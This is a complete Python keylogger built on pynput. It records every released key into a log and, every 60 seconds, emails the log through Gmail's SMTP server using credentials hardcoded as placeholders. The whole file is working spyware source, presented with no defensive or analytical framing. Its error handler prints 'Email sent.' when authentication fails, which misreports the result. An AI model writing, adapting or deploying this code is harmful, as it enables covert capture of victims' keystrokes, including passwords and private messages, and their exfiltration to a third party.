from pynput.keyboard import Key, Listener
from smtplib import SMTP, SMTPAuthenticationError
from threading import Timer


EMAIL_ADDRESS = "YOUR_EMAIL"
EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
SEND_REPORT_EVERY = 60  # as in seconds
EMAIL_HOST = "smtp.gmail.com"
PORT = 587


class Keylogger:
    ks = {
        Key.space: " ",
        Key.enter: "[ENTER]\n",
        Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]"}

    def __init__(self, email, password, time_interval):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password

    def update_log(self, str):
        self.log += str

    def on_release(self, key):
        try:
            name = key.char
        except AttributeError:
            name = Keylogger.ks.get(key, str(key))
        if key == Key.esc:
            # stop listener
            return False
        self.update_log(name.replace("'", ""))

    def send_email(self):
        try:
            server = SMTP(host=EMAIL_HOST, port=PORT)
            # connect to the SMTP server as TLS mode
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, f"\n\n{self.log}")
            server.quit()
        except SMTPAuthenticationError:
            print("Email sent.")

    def report(self):
        self.send_email()
        self.log = ""
        timer = Timer(self.interval, self.report)
        timer.start()

    def start(self):
        # collect events until released
        with Listener(on_release=self.on_release) as listener:
            self.report()
            listener.join()


def main():
    kl = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY)
    kl.start()


if __name__ == "__main__":
    main()
